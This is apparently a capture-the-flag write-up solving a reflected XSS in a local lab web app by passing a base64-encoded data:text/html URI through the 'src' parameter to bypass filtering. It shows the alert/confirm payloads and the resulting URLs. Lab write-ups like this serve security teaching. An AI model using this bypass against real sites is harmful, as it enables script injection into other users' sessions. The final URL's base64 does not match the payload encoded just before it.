## [Reflected XSS](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.html)

The index page has a weirdly loaded image http://localhost:8080/index.php?page=media&src=nsa.

Visiting the page and changing the `src` query parameter shows an HTML `<object>` tag, with a `data` attribute which corresponds to `src`. For example, visiting `http://localhost:8080/index.php?page=media&src=ooga` yields `<object data="ooga">`. Like always when user input is used to display HTML content, we can try an XSS attack using an HTML injection.

We start by trying an HTML injection with `src=<script>confirm("ooga")</script>`, which isn't executed, likely due to URL sanitization.

A common method to bypass the URL encoding is by using base64.

```console
$ echo -n '<script>confirm("ooga")</script>' | base64
PHNjcmlwdD5jb25maXJtKCJvb2dhIik8L3NjcmlwdD4=
```

This works, showing the expected dialog menu: http://localhost:8080/?page=media&src=data:text/html;base64,PHNjcmlwdD5jb25maXJtKCJvb2dhIik8L3NjcmlwdD4=. However, this doesn't yield the flag. We then try the more common `alert` function:

```console
$ echo -n '<script>alert("ooga")</script>' | base64
PHNjcmlwdD5hbGVydCgib29nYSIpPC9zY3JpcHQ+
```

Visiting the page http://localhost:8080/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgib2siKTwvc2NyaXB0Pgo= gives us the flag.
